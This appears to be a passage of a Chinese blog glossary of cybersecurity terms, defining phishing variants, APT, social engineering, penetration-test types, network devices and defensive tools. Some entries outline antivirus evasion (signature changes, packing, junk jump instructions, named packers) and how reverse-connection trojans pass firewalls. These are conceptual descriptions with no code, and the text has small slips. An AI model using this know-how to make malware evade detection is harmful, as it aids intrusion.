title="供应链攻击"></a>供应链攻击</h2><p>供应链攻击是一种面向软件开发人员和供应商的新兴威胁。</p><p>目标是通过感染合法应用分发恶意软件来访问源代码、构建过程或更新机制。</p><p>简单来说：就是是黑客攻击目标机构的合作伙伴，并以该合作伙伴为跳板，达到渗透目标用户的目的。</p><p>一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。</p><p>所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！</p><p>原理：攻击者寻找不安全的网络协议、未受保护的服务器基础结构和不安全的编码做法。 它们将在生成和更新过程中中断、更改源代码以及隐藏恶意软件。</p><p>由于软件由受信任的供应商构建和发布, 因此这些应用和更新已签名并经过认证。</p><p>在软件供应链攻击中, 供应商可能未意识到他们的应用或更新在发布到公众时受到恶意代码的感染。 然后, 恶意代码将以与应用相同的信任和权限运行。</p><h2 id="鱼叉攻击（鱼叉攻击）"><a href="#鱼叉攻击（鱼叉攻击）" class="headerlink" title="鱼叉攻击（鱼叉攻击）"></a>鱼叉攻击（鱼叉攻击）</h2><p>鱼叉攻击是计算机病毒术语，通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。</p><p>鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往”见鱼而使叉”。</p><p>为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。</p><p>通常，组织内的特定个人存在某些安全漏洞不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往”见鱼而使叉”。</p><p>如：</p><p>2014年05月22新疆发生了致死31人的暴力恐怖性事件之后，5月28日，该黑客组织曾发送名为“新疆暴恐事件最新通报”的电子邮件及附件，引诱目标人群“中招”。</p><p>该组织曾发送过的电邮名称还包括“公务员工资收入改革方案”等一系列社会高度关注的热点，令人防不胜防。</p><h2 id="钓鲸攻击（钓鲸攻击）"><a href="#钓鲸攻击（钓鲸攻击）" class="headerlink" title="钓鲸攻击（钓鲸攻击）"></a>钓鲸攻击（钓鲸攻击）</h2><p>所谓 “鲸钓攻击” (Whaling Attack) 指的就是针对高层管理人员的欺诈和商业电子邮件骗局。</p><p>BEC诈骗又称钓鲸欺诈，攻击者要么侵入公司电子邮件账户，要么冒充承包商或商务合作伙伴，发送网络钓鱼邮件提交虚假发票。</p><p>只要发票被支付，资金便会汇入银行，然后被快速洗走。</p><p>简单来说：钓鲸攻击是另一种进化形式的鱼叉式网络钓鱼，它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。</p><h2 id="水坑攻击（水坑攻击）"><a href="#水坑攻击（水坑攻击）" class="headerlink" title="水坑攻击（水坑攻击）"></a>水坑攻击（水坑攻击）</h2><p>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个”水坑(陷阱)”。</p><p>最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站”攻破”并植入攻击代码，一旦攻击目标访问该网站就会”中招”。</p><p>水坑攻击属于APT攻击的一种，与鱼叉攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。</p><p>水坑攻击主要针对的目标多为特定的团体（组织、行业、地区等）。</p><p>攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。</p><p>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的钓鱼攻击具有防护能力的团体。</p><h2 id="APT攻击（APT攻击）"><a href="#APT攻击（APT攻击）" class="headerlink" title="APT攻击（APT攻击）"></a>APT攻击（APT攻击）</h2><p>APT攻击（AdvancedPersistentThreat攻击）：即高级可持续威胁攻击,也称为定向威胁攻击，指某组织对特定对象展开的持续有效的攻击活动。</p><p>这种攻击活动具有极强的隐蔽性和针对性,通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。</p><p>特点：极强的隐蔽性、潜伏期长，持续性强、目标性强</p><h2 id="商业电子邮件攻击（BEC）（电子邮件攻击）"><a href="#商业电子邮件攻击（BEC）（电子邮件攻击）" class="headerlink" title="商业电子邮件攻击（BEC）（电子邮件攻击）"></a>商业电子邮件攻击（BEC）（电子邮件攻击）</h2><p>电子邮件攻击，是商业应用最多的一种商业攻击，我们也将它称为邮件炸弹攻击，就是对某个或多个邮件发送大量的邮件，使网络流量加大占用处理器时间，消耗系统资源，从而使系统瘫痪。</p><p>有许多邮件炸弹软件，虽然它们的操作有所不同，成功率也不稳定，但是有一点就是他们可以隐藏攻击者不被发现。</p><p>也被称为”变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；</p><p>或者攻击者依赖社会工程学制作电子邮件，说服/诱导高管短时间进行经济交易</p><h2 id="电信诈骗（电信诈骗）"><a href="#电信诈骗（电信诈骗）" class="headerlink" title="电信诈骗（电信诈骗）"></a>电信诈骗（电信诈骗）</h2><p>电信诈骗是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，。</p><p>通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。如：</p><p>冒充公检法、商家公司厂家、国家机关工作人员、银行工作人员等各类机构工作人员，伪造和冒充招工、刷单、贷款、手机定位和招嫖等形式进行诈骗。</p><p>从2000年新千年以来，随着科技的发展，一系列技术工具的开发出现和被使用，许多技术人员和一些平民借助于手机、固定电话、网络等通信工具和现代的技术等实施的非接触式的诈骗可以说是迅速地发展蔓延，给人民群众造成了很大的损失。</p><h2 id="网络钓鱼（钓鱼攻击）"><a href="#网络钓鱼（钓鱼攻击）" class="headerlink" title=".网络钓鱼（钓鱼攻击）"></a>.网络钓鱼（钓鱼攻击）</h2><p>网络钓鱼（Phishing，与钓鱼的英语fishing发音相近，又名钓鱼法或钓鱼式攻击）是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件，意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息）的一种攻击方式。</p><p>网络钓鱼 （Phishing）攻击者利用欺骗性的电子邮件和伪造的 Web 站点来进行网络诈骗活动，受骗者往往会泄露自己的私人资料，如信用卡号、银行卡账户、身份证号等内容。</p><p>诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息。</p><p>如今的”网络钓鱼”攻击利用欺骗性的电子邮件和伪造的Web站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、账户用户名、口令和社保编号等内容</p><h2 id="社会工程学攻击（社会工程攻击）"><a href="#社会工程学攻击（社会工程攻击）" class="headerlink" title="社会工程学攻击（社会工程攻击）"></a>社会工程学攻击（社会工程攻击）</h2><p>社会工程攻击，是一种利用”社会工程学” 来实施的网络攻击行为。</p><p>社会工程学攻击是一种通过对被攻击者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱所采取的诸如欺骗、伤害等危害手段，获取自身利益的手法。</p><p>所有社会工程学攻击都建立在使人决断产生认知偏差的基础上。有时候这些偏差被称为“人类硬件漏洞”，足以产生众多攻击方式。如：假托、调虎离山、在线聊天、等价交换等等。</p><p>黑客社会工程学攻击则是将黑客入侵攻击手段进行了最大化，不仅能够利用系统的弱点进行入侵，还能通过人性的弱点进行入侵，当黑客攻击与社会工程学攻击融为一体时，将根本不存在所谓安全的系统</p><h2 id="假托（假托）"><a href="#假托（假托）" class="headerlink" title="假托（假托）"></a>假托（假托）</h2><p>假托（pretexting）是一种社交工程（social engineering）的形式，其中个体通过欺诈来获取特权数据。假托是一种虚假的动机。</p><p>假托（pretexting）是一种制造虚假情形，以迫使针对受害人吐露平时不愿泄露的信息的手段。该方法通常预含对特殊情景专用术语的研究，以建立合情合理的假象。</p><p>假托（pretexting）通常是一个骗局，欺骗者在骗局中假装需要信息来确认对话人的身份。</p><p>在和目标对象建立信任之后，假托者可能会问一系列问题来收集关键的个人身份信息，如确认个人社会保险号、母亲的婚前姓、出生地或日期或者是帐户号。</p><h2 id="蜜罐（蜜罐）"><a href="#蜜罐（蜜罐）" class="headerlink" title="蜜罐（蜜罐）"></a>蜜罐（蜜罐）</h2><p>蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p><p>简单来说：好比是情报收集系统。故意让人攻击的目标，引诱黑客来攻击，所以攻击者攻击后，你就可以知道他是如何得逞的，随时了解针对你的服务器发动的最新的攻击和漏洞。</p><p>还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络，蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。</p><p>蜜罐类产品包括蜜网、蜜系统、蜜账号等等。</p><h2 id="免杀（免杀）"><a href="#免杀（免杀）" class="headerlink" title="免杀（免杀）"></a>免杀（免杀）</h2><p>免杀技术全称为反杀毒技术Anti Anti- Virus简称”免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</p><p>由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><p>简单来说：就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</p><h2 id="花指令（花指令）"><a href="#花指令（花指令）" class="headerlink" title="花指令（花指令）"></a>花指令（花指令）</h2><p>花指令是，由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编内容的内容，迷失方向。</p><p>经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。</p><p>花指令有可能利用各种指令：jmp, call, ret的一些技巧堆栈，位置运算，等等。</p><p>简单来说：就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常的判断病毒文件的构造。</p><p>再通俗点就是杀毒软件是从头到脚按顺序来查找病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。</p><h2 id="加壳（加壳）"><a href="#加壳（加壳）" class="headerlink" title="加壳（加壳）"></a>加壳（加壳）</h2><p>加壳的全称应该是可执行程序资源压缩，压缩后的程序可以直接运行。</p><p>加壳的另一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，之后再把控制权交还给原始代码，这样做的目的是隐藏程序真正的OEP（入口点，防止被破解）。大多数病毒就是基于此原理。</p><p>加壳的程序需要阻止外部程序或软件对加壳程序本身的反汇编分析或者动态分析，以达到保护壳内原始程序以及软件不被外部程序破坏，保证原始程序正常运行。</p><p>这种技术也常用来保护软件版权，防止软件被破解。但对于病毒，加壳可以绕过一些杀毒软件的扫描，从而实现它作为病毒的一些入侵或破坏的一些特性。</p><p>简单来说：就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。</p><p>目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</p><h2 id="脱壳（脱壳）"><a href="#脱壳（脱壳）" class="headerlink" title="脱壳（脱壳）"></a>脱壳（脱壳）</h2><p>在一些计算机软件里有一段专门负责保护软件不被非法修改或反编译的程序。</p><p>它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p><p>由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”。</p><p>软件加壳是作者写完软件后，为了保护自己的代码或维护软件产权等利益所常用到的手段。有很多加壳工具，既然有盾，自然就有矛，脱壳即去掉软件所加的壳，软件有手动脱和自动脱壳之分，</p><h2 id="软件加壳（加壳）"><a href="#软件加壳（加壳）" class="headerlink" title="软件加壳（加壳）"></a>软件加壳（加壳）</h2><p>“壳”是一段专门负责保护软件不被非法修改或反编译的程序。</p><p>它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p><p>经过加壳的软件在跟踪时已看到其真实的十六进制代码，因此可以起到保护软件的目的。</p><h2 id="软件脱壳（软件脱壳）"><a href="#软件脱壳（软件脱壳）" class="headerlink" title="软件脱壳（软件脱壳）"></a>软件脱壳（软件脱壳）</h2><p>软件脱壳，顾名思义，就是对软件加壳的逆操作，把软件上存在的壳去掉。</p><p>在一些计算机软件里也有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。</p><p>由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”了。</p><p>就像计算机病毒和自然界的病毒一样，其实都是命名上的方法罢了。</p><h2 id="渗透测试（渗透测试）"><a href="#渗透测试（渗透测试）" class="headerlink" title="渗透测试（渗透测试）"></a>渗透测试（渗透测试）</h2><p>简单来说：渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全安全的一种评估方法。</p><p>这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。</p><p>渗透测试，是为了证明网络防御按照预期计划正常运行而提供的一种机制。</p><p>不妨假设，你的公司定期更新安全策略和程序，时时给系统打补丁，并采用了漏洞扫描器等工具，以确保所有补丁都已打上。</p><p>如果你早已做到了这些，为什么还要请外方进行审查或渗透测试呢？</p><p>因为，渗透测试能够独立地检查你的网络策略，换句话说，就是给你的系统安了一双眼睛。</p><p>而且，进行这类测试的，都是寻找网络系统安全漏洞的专业人士。</p><p>渗透测试包括：黑盒测试、白盒测试、灰盒测试</p><h2 id="渗透（渗透）渗透测试类型"><a href="#渗透（渗透）渗透测试类型" class="headerlink" title="渗透（渗透）渗透测试类型"></a>渗透（渗透）渗透测试类型</h2><p>就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。</p><p>黑客技术里的渗透是指黑客通过非法途径入侵网站系统，拿到网站的WebShell进行非法操作。也指信息安全风险评估。</p><h2 id="黑盒测试（黑盒测试）渗透测试类型"><a href="#黑盒测试（黑盒测试）渗透测试类型" class="headerlink" title="黑盒测试（黑盒测试）渗透测试类型"></a>黑盒测试（黑盒测试）渗透测试类型</h2><p>渗透黑盒测试与软件黑盒测试有一点区别。</p><p>软件黑盒测试：</p><p>它是通过测试来检测每个功能是否都能正常使用。</p><p>在测试中，把程序看作一个不能打开的黑盒子，在完全不考虑程序内部结构和内部特性的情况下，在程序接口进行测试，它只检查程序功能是否按照需求规格说明书的规定正常使用，程序是否能适当地接收输入数据而产生正确的输出信息。</p><p>黑盒测试着眼于程序外部结构，不考虑内部逻辑结构，主要针对软件界面和软件功能进行测试。渗透测试类型</p><p>黑盒测试是以用户的角度，从数据输入与输出数据的对应关系出发进行测试的。</p><p>渗透黑盒测试：</p><p>经过授权的黑盒测试是设计成为模拟攻击者的入侵行为，并在不了解客户组织大部分信息和知识的情况下实施的。黑盒测试可以用来测试内部安全团队检测和应对一次攻击的能力。</p><p>黑盒测试比较费时，同时对技术要求比较高。</p><p>在安全业界的渗透测试眼中，黑盒测试能更逼真地模拟了一次真正的攻击过程。</p><p>黑盒测试依靠测试人员的能力探测获取目标系统的信息，作为一次黑盒测试的渗透测试者，通常不需要找出目标系统的所有安全漏洞，而只需要尝试找出并利用可以获取目标系统访问权代价最小的攻击路径，并保证不被检测到。</p><p>渗透届黑盒测试一般指不知道源码，无法进行代码审计的测试。</p><h2 id="白盒测试（白盒测试）渗透测试类型"><a href="#白盒测试（白盒测试）渗透测试类型" class="headerlink" title="白盒测试（白盒测试）渗透测试类型"></a>白盒测试（白盒测试）渗透测试类型</h2><p>渗透百合测试与软件白盒测试有一点区别。</p><p>软件白盒测试：</p><p>白盒测试又称结构测试、透明盒测试、逻辑驱动测试或基于代码的测试。</p><p>白盒测试是一种测试用例设计方法，盒子指的是被测试的软件，白盒指的是盒子是可视的，即清楚盒子内部的东西以及里面是如何运作的。</p><p>“白盒”法全面了解程序内部逻辑结构、对所有逻辑路径进行测试。</p><p>“白盒”法是穷举路径测试。在使用这一方案时，测试者必须检查程序的内部结构，从检查程序的逻辑着手，得出测试数据。贯穿程序的独立路径数是天文数字。</p><p>渗透白盒测试：</p><p>使用白盒测试，需要和客户组织一起工作，来识别出潜在的安全风险。</p><p>白盒测试的最大好处是测试者将拥有所有的内部知识，并可以在不需要害怕被阻断的情况下任意地实施破坏。</p><p>而白盒测试最大的问题在于无法有效地测试客户组织的应急响应程序，也无法判断出他们的安全防护计划对检测特定攻击的效率。</p><p>白盒测试适用于时间比较紧急，或是特定的渗透测试环境如情报收集并不在范围之内的测试场景。</p><p>渗透届黑盒测试一般指知道源码，可以进行代码审计的测试。</p><h2 id="灰盒测试（灰盒测试）渗透测试类型"><a href="#灰盒测试（灰盒测试）渗透测试类型" class="headerlink" title="灰盒测试（灰盒测试）渗透测试类型"></a>灰盒测试（灰盒测试）渗透测试类型</h2><p>软件灰盒测试：</p><p>灰盒测试，是介于白盒测试与黑盒测试之间的一种测试，灰盒测试多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。</p><p>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑，常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p><p>渗透灰盒测试：</p><p>以上两种渗透测试基本类型的组合可以提供对目标系统更加深入和全面的安全审查，这就是灰盒测试（Grey-box Testing），组合之后的好处就是能够同时发挥两种基本类型渗透测试方法的各自优势。</p><p>灰盒测试需要渗透测试者能够根据对目标系统所掌握的有限知识与信息，来选择评估整体安全性的最佳途径。</p><p>在采用灰盒测试方法的外部渗透场景中，渗透测试者也类似地需要从外部逐步渗透进入目标网络，但他所拥有的目标网络底层拓扑与架构将有助于更好地决策攻击途径与方法，从而达到更好的渗透测试效果。</p><h2 id="黑帽黑客（黑帽黑客）"><a href="#黑帽黑客（黑帽黑客）" class="headerlink" title="黑帽黑客（黑帽黑客）"></a>黑帽黑客（黑帽黑客）</h2><p>与白帽黑客相反，黑帽黑客(black hat hacker)就是人们常说的“黑客”或“骇客”了。</p><p>这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。</p><p>他们往往利用自身技术，在网络上窃取别人的资源或破解收费的软件，以达到获利。</p><p>虽然在他们看来这是因为技术而就得到的，但是这种行为却往往破坏了整个市场的秩序，或者泄露了别人的隐私。</p><p>简单来说：为了非法目进行黑客攻击的人。</p><h2 id="白帽黑客（白帽黑客）"><a href="#白帽黑客（白帽黑客）" class="headerlink" title="白帽黑客（白帽黑客）"></a>白帽黑客（白帽黑客）</h2><p>白帽黑客网络用语中指站在黑客的立场攻击自己的系统以进行安全漏洞排查的程序员。</p><p>他们用的是黑客惯用的破坏攻击的方法，行的却是维护安全之事。</p><p>用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。</p><h2 id="红帽黑客（红客）"><a href="#红帽黑客（红客）" class="headerlink" title="红帽黑客（红客）"></a>红帽黑客（红客）</h2><p>红客(Honker(A person or thing that honks))是指维护国家利益，不利用网络技术入侵自己国家电脑，而是”维护正义，为自己国家争光的黑客”。</p><p>红客是一种精神，它是一种热爱祖国、坚持正义、开拓进取的精神。所以只要具备这种精神并热爱着计算机技术的都可称为红客。</p><p>红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。</p><p>简单来说：为人所接受的说法叫红客，红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。</p><h2 id="红队（红队）"><a href="#红队（红队）" class="headerlink" title="红队（红队）"></a>红队（红队）</h2><p>通常指攻防演习中的攻击队伍</p><h2 id="蓝队（蓝队）"><a href="#蓝队（蓝队）" class="headerlink" title="蓝队（蓝队）"></a>蓝队（蓝队）</h2><p>通常指攻防演习中的防守队伍</p><h2 id="紫队（紫队）"><a href="#紫队（紫队）" class="headerlink" title="紫队（紫队）"></a>紫队（紫队）</h2><p>攻防演习中新近诞生的一方，通常指监理方或者裁判方</p><h2 id="ip地址（ip地址）"><a href="#ip地址（ip地址）" class="headerlink" title="ip地址（ip地址）"></a>ip地址（ip地址）</h2><p>internet上的电脑有许多，为了让他们能够相互识别，internet上的每一台主机都分配有一个唯一的32位地址，该地址称为ip地址，也称作网际地址，ip地址由4个数值部分组成，每个数值部分可取值0-255，各部分之间用一个‘.‘分开</p><p>IP地址（Internet Protocol Address）是指互联网协议地址，又译为网际协议地址。</p><p>IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。</p><h2 id="端口（端口）"><a href="#端口（端口）" class="headerlink" title="端口（端口）"></a>端口（端口）</h2><p>端口：（Port）相当于一种数据的传输通道。</p><p>用于接受某些数据，然后传输给相应的服务，而电脑将这些数据处理后，再将相应的恢复通过开启的端口传给对方。</p><p>一般每一个端口的开放的偶对应了相应的服务，要关闭这些端口只需要将对应的服务关闭就可以了</p><h2 id="端口扫描（端口扫描）"><a href="#端口扫描（端口扫描）" class="headerlink" title="端口扫描（端口扫描）"></a>端口扫描（端口扫描）</h2><p>端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型（这些网络服务均与端口号相关）。</p><p>端口扫描是计算机解密高手喜欢的一种方式。</p><p>攻击者可以通过它了解到从哪里可探寻到攻击弱点。实质上，端口扫描包括向每个端口发送消息，一次只发送一个消息。接收到的回应类型表示是否在使用该端口并且可由此探寻弱点。</p><p>扫描器是一种自动检测远程或本机主机安全性弱点的程序，通过使用扫描器你可以不留痕迹的发现远程服务器的各种TCP端口的分配及提供的服务和它们的软件版本！</p><p>这就能让我们间接的或直观的了解到远程主机所存在的安全问题。</p><p>简单来说：端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。</p><h2 id="反弹端口（反弹端口原理）"><a href="#反弹端口（反弹端口原理）" class="headerlink" title="反弹端口（反弹端口原理）"></a>反弹端口（反弹端口原理）</h2><p>有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。<br>于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。</p><p>简单地说，就是由木马的服务端主动连接客户端所在IP对应的电脑的80端口。相信没有哪个防火墙会拦截这样的连接（因为它们一般认为这是用户在浏览网页），所以反弹端口型木马可以穿墙。</p><h2 id="端口映射（端口映射）"><a href="#端口映射（端口映射）" class="headerlink" title="端口映射（端口映射）"></a>端口映射（端口映射）</h2><p>端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。</p><p>端口映射功能可以让内部网络中某台机器对外部提供WWW服务，这不是将真IP地址直接转到内部提供www服务的主机。</p><h2 id="路由器（路由器）"><a href="#路由器（路由器）" class="headerlink" title="路由器（路由器）"></a>路由器（路由器）</h2><p>路由器（Router）是连接两个或多个网络的硬件设备，在网络间起网关的作用，是读取每一个数据包中的地址然后决定如何传送的专用智能性的网络设备。</p><p>它能够理解不同的协议，例如某个局域网使用的以太网协议，因特网使用的TCP/IP协议。</p><p>这样，路由器可以分析各种不同类型网络传来的数据包的目的地址，把非TCP/IP网络的地址转换成TCP/IP地址，或者反之；再根据选定的路由算法把各数据包按最佳路线传送到指定位置。</p><p>所以路由器可以把非TCP/IP网络连接到因特网上。</p><p>简单来说：路由器的主要作用就是路由选择，将IP数据包正确的送到目的地，因此也叫IP路由器，外网装换为内网的东西，由dns转换。路由器是在网络上使用最高的设备之一。</p><h2 id="交换机（交换机）"><a href="#交换机（交换机）" class="headerlink" title="交换机（交换机）"></a>交换机（交换机）</h2><p>交换机（Switch）意为”开关”是一种用于电（光）信号转发的网络设备。</p><p>它可以为接入交换机的任意两个网络节点提供独享的电信号通路。最常见的交换机是以太网交换机。其他常见的还有电话语音交换机、光纤交换机等。</p><h2 id="网关（网关）"><a href="#网关（网关）" class="headerlink" title="网关（网关）"></a>网关（网关）</h2><p>网关(Gateway)又称网间连接器、协议转换器。</p><p>网关在网络层以上实现网络，是复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。</p><p>网关是一种充当转换重任的计算机系统或设备。使用在不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。</p><p>与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同层—-应用层。</p><p>通常指路由器、防火墙、IDS、VPN等边界网络设备。</p><h2 id="独立服务器（独立服务器）"><a href="#独立服务器（独立服务器）" class="headerlink" title="独立服务器（独立服务器）"></a>独立服务器（独立服务器）</h2><p>独立服务器一般指独立IP主机。独立IP主机是指在服务器上用一定的技术划分出多个空间以后，在每个虚拟主机上配上独立的ip。</p><p>独立服务器整体硬件都是独立的，性能强大，特别是CPU，被认为是性能最佳的托管选项之一。</p><p>使用真实存在的独立服务器就像拥有自己的房子，没有人打扰，可以部署任何想要的东西。</p><p>简单来说：就是整台服务器只有一个用户享有，只有一人使用。拥有独立的IP、内存、带宽、硬盘，可以使用任何系统，可以运行各种网站及配置各种网站环境，对访问量也没有限制。</p><h2 id="proxy（proxy）"><a href="#proxy（proxy）" class="headerlink" title="proxy（proxy）"></a>proxy（proxy）</h2><p>指的是代理软件或代理服务器，也可以认为是一种网络访问方式。</p><p>代理类，用来进行事物不想或不能进行的其他操作，比如当你对数据库进行操作时，代理可以在你对数据库操作完后，记录下你所进行的操作。</p><p>简单来说：代理，一类程序或系统，接收来自客户机算计的流量，并代表客户与服务器交互。</p><p>代理能用于过滤应用级别的制定类型的流量或缓存信息以提高性能。许多防火墙依赖代理进行过滤</p><h2 id="WAF（WAF）"><a href="#WAF（WAF）" class="headerlink" title="WAF（WAF）"></a>WAF（WAF）</h2><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。</p><p>国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为web应用提供保护的一款产品。</p><p>简单来说：就是为应用层提供防护的防火墙。</p><h2 id="防火墙（防火墙）"><a href="#防火墙（防火墙）" class="headerlink" title="防火墙（防火墙）"></a>防火墙（防火墙）</h2><p>防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。 </p><p>防火墙技术的功能主要在于及时发现并处理计算机网络运行时可能存在的安全风险、数据传输等问题，其中处理措施包括隔离与保护，同时可对计算机网络安全当中的各项操作实施记录与检测，以确保计算机网络运行的安全性，保障用户资料与信息的完整性，为用户提供更好、更安全的计算机网络使用体验。</p><p>主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。</p><h2 id="反病毒引擎（杀毒引擎）"><a href="#反病毒引擎（杀毒引擎）" class="headerlink" title="反病毒引擎（杀毒引擎）"></a>反病毒引擎（杀毒引擎）</h2><p>反病毒引擎其实就是杀毒引擎，又叫做AV。</p><p>通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。</p><p>杀毒引擎是杀毒软件的主要部分。是去检测和发现病毒的程序。而病毒库是已经发现的病毒的标本。用病毒库中的标本去对照机器中的所有程序或文件，看是不是符合这些标本，是则是病毒，否就不一定是病毒（因为还有很多没有被发现的或者刚刚产生的病毒）。</p><h2 id="防毒墙（防毒墙）"><a href="#防毒墙（防毒墙）" class="headerlink" title="防毒墙（防毒墙）"></a>防毒墙（防毒墙）</h2><p>人类步入了二十一世纪，信息产业飞速发展，互联网正在迅速地发展和普及。</p><p>伴随而来的是计算机病毒的日益猖狂。尽管许多企业已经具有了一定的安全防范意识，并且部署了网络版杀毒软件和硬件防火墙，但是在面对诸如SQLSlammer等新的蠕虫病毒时，仍然显得力不从心。</p><p>面对现今恶劣的互联网安全状况，只有强有力的防毒墙才能保障企业网络的安全。</p><p>区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。</p><h2 id="IDS（入侵检测系统）"><a href="#IDS（入侵检测系统）" class="headerlink" title="IDS（入侵检测系统）"></a>IDS（入侵检测系统）</h2><p>入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截，IDS是不同于防火墙。</p><p>防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。</p><p>简单来说：就是起检测作用的，常常与IPS一起使用。</p><h2 id="NIDS（网络入侵检测系统）"><a href="#NIDS（网络入侵检测系统）" class="headerlink" title="NIDS（网络入侵检测系统）"></a>NIDS（网络入侵检测系统）</h2><p>NIDS是NetworkIntrusion Detection 